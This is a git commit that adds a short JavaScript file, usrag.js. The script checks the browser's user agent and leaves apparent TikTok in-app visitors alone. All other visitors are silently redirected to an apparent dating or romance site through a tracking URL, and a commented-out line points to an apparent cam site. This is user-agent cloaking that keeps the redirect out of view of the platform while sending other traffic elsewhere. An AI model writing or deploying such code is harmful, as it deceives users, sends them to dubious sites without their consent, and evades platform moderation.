269d9959e21dba2dd82780740dc3939c8a4ad6ec
NikDzub <87159434+NikDzub@users.noreply.github.com>
2024-08-07 21:50:33 +0300

    .

---
+++ usrag.js
@@ -0,0 +1,9 @@
+let agent = navigator.userAgent;
+
+if (agent.indexOf('music') >= 0) {
+  console.log('in tiktok app');
+} else {
+  window.location = 'https://thelivelyromance.life/?u=13bk60m&o=0rupv4g';
+  //  window.location = 'https://watchmenow.cam/';
+}
+// document.querySelector('body').innerText = agent;
